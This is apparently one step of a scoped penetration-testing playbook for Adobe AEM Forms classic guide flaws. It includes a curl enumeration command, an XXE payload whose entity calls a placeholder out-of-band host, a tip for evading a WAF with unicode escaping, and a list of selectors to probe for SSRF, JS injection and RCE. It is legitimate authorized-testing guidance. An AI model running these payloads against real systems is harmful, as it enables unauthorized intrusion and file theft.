# Batch 13 — AEM Forms classic: guide XXE / JS (Egorov)

## objective

Test **APSB19-48-era** Forms guide issues (XXE / WSDL / JS injection) **only if** prerequisites exist. Prefer OOB proofs.

Source: Egorov adapt.to 2020.

## estimated_time

60–120 minutes

## prerequisites

- Batch 12: Forms / guideContainer likely  
- Node type `fd/af/components/guideContainer` exists  
- Some **jcr:write** path for anonymous/low user (historical example: user-generated commerce paths) — if **no write**, stop after proving container list  
- OAST/collaborator URL  
- Dangerous tests allowed in scope

## testing_workflow

### 1) Technique A — find containers

```bash
curl -sk -G "$QB" \
  --data-urlencode "property=sling:resourceType" \
  --data-urlencode "property.value=fd/af/components/guideContainer" \
  --data-urlencode "p.limit=20" -o guides.json
```

### 2) Technique B — XXE shape on internalsubmit (if endpoint reachable)

Payload concept:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE afData [
<!ENTITY a SYSTEM "http://YOUR-OAST/xxe">
]>
<afData>&a;</afData>
```

WAF dodge: unicode-escape XML into `\u00xx` form (see reference/08).

Use POST to the guide resource with selector `af.internalsubmit` when you have a valid resource path from guides.json.

### 3) Technique C — WSDL / submit selectors (time-boxed)

- `af.wsdl` — remote WSDL → OOB DTD  
- `af.submit` / `af.agreement` / `af.signSubmit` — JS injection / SSRF in sandbox  

Max 40 minutes total on C if B fails. Versions differ (RCE vs blind SSRF vs dead).

## decision_points

| If… | Then… |
|-----|--------|
| No write + no POST sink | Stop classic track; go **14** only if standalone modern surface exists |
| OOB XXE callback | Solid finding; optional file read if reflected |
| Only blind SSRF | Report with collab evidence |

## expected_findings

- XXE file/SSRF, JS injection, misconfig write + Forms component

## next_batch_to_continue_with

→ **[14-forms-modern-rce.md](./14-forms-modern-rce.md)** if standalone surfaces exist  
else → **[15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)**
